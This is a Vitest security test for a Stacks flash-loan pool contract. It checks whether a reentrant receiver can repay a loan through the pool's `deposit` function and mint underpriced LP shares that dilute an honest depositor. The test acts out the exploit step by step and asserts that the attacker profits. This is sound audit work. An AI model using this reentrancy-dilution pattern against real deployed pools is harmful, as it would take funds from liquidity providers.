import { describe, expect, it, beforeEach } from "vitest";
import { Cl } from "@stacks/transactions";

/**
 * Hypothesis (ajv.1.5 threat model, reentrancy row): flashstack-stx-pool-v2 has
 * no reentrancy lock (unlike flashstack-pool-v3's per-asset lock, pv3-F1). Its
 * own doc comment claims "Reentrancy-safe: reserve checked after callback
 * returns" -- true against a receiver that simply keeps the funds, but that
 * claim says nothing about a receiver that repays via `deposit` instead of a
 * plain transfer. `deposit` is a public function like any other; nothing stops
 * flash-loan's receiver callback from calling it before the balance check runs.
 *
 * If that satisfies the repayment check AND mints LP shares, it mints them
 * against the pool's balance as depressed by this same loan's outbound
 * transfer (reserve-before minus amount), not the pool's real pre-loan balance
 * -- a cheaper share price than any honest depositor could get, diluting
 * existing LPs. This test proves or disproves that the vector is real, with a
 * receiver funded only with fee-sized capital (not the loan amount itself).
 */

const POOL = "flashstack-stx-pool-v2";
const RX = "test-pool-v2-receiver-deposit-reentrant";

const LP_DEP = 100_000_000; // 100 STX, the only honest LP
const LOAN_AMOUNT = 99_000_000; // 99 STX -- nearly all of the reserve
const RX_BUFFER = 10_000; // attacker's own capital: covers the fee only

describe("flashstack-stx-pool-v2: reentrant deposit-as-repayment", () => {
  let deployer: string, attacker: string, honestLp: string;

  const shares = (who: string) =>
    Number(simnet.callReadOnlyFn(POOL, "get-shares", [Cl.principal(who)], deployer).result.value);
  const stxValue = (who: string) =>
    Number(simnet.callReadOnlyFn(POOL, "get-stx-value", [Cl.principal(who)], deployer).result.value);

  beforeEach(() => {
    deployer = simnet.getAccounts().get("deployer")!;
    attacker = simnet.getAccounts().get("wallet_1")!;
    honestLp = simnet.getAccounts().get("wallet_2")!;

    simnet.callPublicFn(POOL, "deposit", [Cl.uint(LP_DEP)], honestLp);
    simnet.callPublicFn(POOL, "add-approved-receiver", [Cl.principal(`${deployer}.${RX}`)], deployer);
    simnet.transferSTX(RX_BUFFER, `${deployer}.${RX}`, attacker);
  });

  it("the loan succeeds by depositing instead of repaying directly", () => {
    const result = simnet.callPublicFn(
      POOL, "flash-loan", [Cl.uint(LOAN_AMOUNT), Cl.contractPrincipal(deployer, RX)], attacker,
    ).result;
    expect(result).toBeOk(Cl.bool(true));
  });

  it("the attacker ends up owning a share of the pool worth more than the fee they actually paid", () => {
    simnet.callPublicFn(
      POOL, "flash-loan", [Cl.uint(LOAN_AMOUNT), Cl.contractPrincipal(deployer, RX)], attacker,
    );

    const feePaid = RX_BUFFER; // everything else the receiver deposited was the borrowed principal, not new capital
    const attackerShares = shares(attacker);
    const attackerValue = stxValue(attacker);
    const honestLpValue = stxValue(honestLp);

    // If this is a real vector: attacker holds shares (credited to tx-sender,
    // not the receiver contract), worth far more than the ~fee they put in,
    // and the honest LP's share of the now-larger pool is diluted below their
    // original deposit.
    expect(attackerShares).toBeGreaterThan(0);
    expect(attackerValue).toBeGreaterThan(feePaid * 10);
    expect(honestLpValue).toBeLessThan(LP_DEP);
  });
});
